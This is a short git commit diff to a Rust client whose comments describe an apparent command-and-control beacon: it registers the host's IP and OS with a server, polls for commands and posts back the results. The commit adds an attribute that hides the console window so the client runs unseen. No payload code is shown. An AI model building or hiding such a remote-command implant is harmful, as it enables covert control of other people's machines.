92326dbe87df120b9eb1add4d2a4c45ce3663161
Drew Young <dmy625@comcast.net>
2023-02-09 19:01:00 -0500

    added line to not open cmd prompt when run

--- client/src/main.rs
+++ client/src/main.rs
@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 //Get local IP and OS, make a POST request to [SERVER]/newHost and record identifier
 //Constantly pull the page [SERVER]/IDENTIFIER/commands and POST results to [SERVER]/IDENTIFIER/responses
 
